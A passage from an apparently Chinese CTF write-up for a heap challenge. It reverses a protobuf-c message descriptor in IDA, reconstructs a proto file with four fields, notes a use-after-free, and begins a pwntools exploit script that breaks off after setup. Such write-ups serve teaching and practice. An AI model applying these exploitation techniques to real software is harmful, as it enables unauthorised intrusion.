v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1329();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有沙盒不能getshell</p><p><code>sub_155D</code>是一个很明显的菜单堆,漏洞也很清晰就是一个uaf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_155D</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= <span class="number">0x21</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a4 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( (__int64)a3 &lt; (__int64)a4 )</span><br><span class="line">    v6 = a4;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_14FC(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_148A(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_1347(a2, v6, a4, a5);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">return</span> sub_13EF(a2, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个格式是不是很像protobuf的解包函数</p><p>以及结合我们在字符串中发现的一些字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000074E000000022CBINARYBF_c_service_generated_init</span><br><span class="line">.rodata:000000000000752000000023CBINARYBF_c_service_invoke_internal</span><br><span class="line">.rodata:000000000000756000000021CBINARYBF_c_message_free_unpacked</span><br><span class="line">.rodata:00000000000075900000001DCparse_packed_repeated_member</span><br><span class="line">.rodata:00000000000075B00000000DCparse_member</span><br><span class="line">.rodata:00000000000075C00000001ACBINARYBF_c_message_unpack</span><br><span class="line">.rodata:00000000000075E00000001BCpack_buffer_packed_payload</span><br><span class="line">.rodata:00000000000076000000001ACget_packed_payload_length</span><br><span class="line">.rodata:00000000000076200000001ECrepeated_field_pack_to_buffer</span><br><span class="line">.rodata:00000000000076400000001ECrequired_field_pack_to_buffer</span><br><span class="line">.rodata:000000000000766000000022CBINARYBF_c_message_pack_to_buffer</span><br><span class="line">.rodata:00000000000076900000001DCsizeof_elt_in_repeated_array</span><br><span class="line">.rodata:00000000000076B000000014Crepeated_field_pack</span><br><span class="line">.rodata:00000000000076D000000014Crequired_field_pack</span><br><span class="line">.rodata:00000000000076F000000018CBINARYBF_c_message_pack</span><br><span class="line">.rodata:00000000000077100000001FCrequired_field_get_packed_size</span><br><span class="line">.rodata:000000000000774000000023CBINARYBF_c_message_get_packed_size</span><br><span class="line">.rodata:000000000000776400000018CBINARYBF-c/BINARYBF-c.c</span><br><span class="line">.rodata:000000000000777E00000006C1.4.1</span><br><span class="line">.rodata:000000000000778400000013Ctmp == payload_len</span><br><span class="line">.rodata:000000000000779700000017Crv-&gt;descriptor != NULL</span><br><span class="line">.rodata:00000000000077B00000002ECmethod_index &lt; service-&gt;descriptor-&gt;n_methods</span><br><span class="line">.rodata:00000000000077E000000047C((message)-&gt;descriptor)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078280000002ACactual_length_size == length_size_min + 1</span><br><span class="line">.rodata:000000000000785800000036C(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078900000003CC(descriptor)-&gt;magic == BINARYBF_C__SERVICE_DESCRIPTOR_MAGIC</span><br></pre></td></tr></table></figure><p>基本能够确定这是protobuf的unpack函数,版本是1.4.1</p><p>那么逆向的关键其实就是在<code>&amp;unk_9C80</code>了</p><p>很显然这是一个<code>ProtobufCMessageDescriptor</code>对象</p><p>我们只需要在ida中手动添加一下结构体(一些不重要的类型直接用大小相等的数据类型替代)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ; Ins/Del : create/delete structure</span><br><span class="line"><span class="number">00000000</span> ; D/A<span class="comment">/*   : create structure member (data/ascii/array)</span></span><br><span class="line"><span class="comment">00000000 ; N       : rename structure or structure member</span></span><br><span class="line"><span class="comment">00000000 ; U       : delete structure member</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Verneed. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Vernaux. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCMessageDescriptor struc ; (sizeof=0x78, align=0x8, copyof_19)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: .data.rel.ro:stru_9C80/r</span></span><br><span class="line"><span class="comment">00000000 magic dd ?</span></span><br><span class="line"><span class="comment">00000004 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000005 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000006 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000007 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000008 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000010 short_name dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000018 c_name dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000020 package_name dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000028 sizeof_message dq ?</span></span><br><span class="line"><span class="comment">00000030 n_fields dd ?</span></span><br><span class="line"><span class="comment">00000034 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000035 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000036 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000037 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000038 fields dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000040 fields_sorted_by_name dq ?              ; offset</span></span><br><span class="line"><span class="comment">00000048 n_field_ranges dd ?</span></span><br><span class="line"><span class="comment">0000004C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000050 field_ranges dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000058 message_init dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000060 reserved1 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000068 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000070 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000078 ProtobufCMessageDescriptor ends</span></span><br><span class="line"><span class="comment">00000078</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCFieldDescriptor struc ; (sizeof=0x48, align=0x8, copyof_18)</span></span><br><span class="line"><span class="comment">00000000 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000008 id dd ?</span></span><br><span class="line"><span class="comment">0000000C label dd ?</span></span><br><span class="line"><span class="comment">00000010 type dd ?</span></span><br><span class="line"><span class="comment">00000014 quantifier_offset dd ?</span></span><br><span class="line"><span class="comment">00000018 offset dd ?</span></span><br><span class="line"><span class="comment">0000001C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000020 descriptor dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000028 default_value dq ?                      ; offset</span></span><br><span class="line"><span class="comment">00000030 flags dd ?</span></span><br><span class="line"><span class="comment">00000034 reserved_flags dd ?</span></span><br><span class="line"><span class="comment">00000038 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000040 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000048 ProtobufCFieldDescriptor ends</span></span><br><span class="line"><span class="comment">00000048</span></span><br></pre></td></tr></table></figure><p>这样看起来就舒服多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 dq offset aActionid                     ; name</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:stru_9C80↓o</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 18 00 00 00 00 00+dd 1                                    ; id ; &quot;actionid&quot;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 18h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00                         db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+dq offset aMsgidx                       ; name ; &quot;msgidx&quot;</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 04 00 00 00+dd 2                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 20 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 20h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+dq offset aMsgsize                      ; name ; &quot;msgsize&quot;</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 04 00 00 00+dd 3                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 28 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 28h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+dq offset aMsgcontent                   ; name ; &quot;msgcontent&quot;</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 0F 00 00 00+dd 4                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 30 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0Fh                                  ; type</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 30h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message Devicemsg&#123;</span><br><span class="line">required sint64 actionid = <span class="number">1</span>;</span><br><span class="line">required sint64 msgidx = <span class="number">2</span>;</span><br><span class="line">required sint64 msgsize = <span class="number">3</span>;</span><br><span class="line">required bytes msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后只需要使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=. ./msg.proto</span><br></pre></td></tr></table></figure><p>就可以生成python专用的脚本文件</p><p>之后只需要在exp中import就可以进行序列化交互了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span 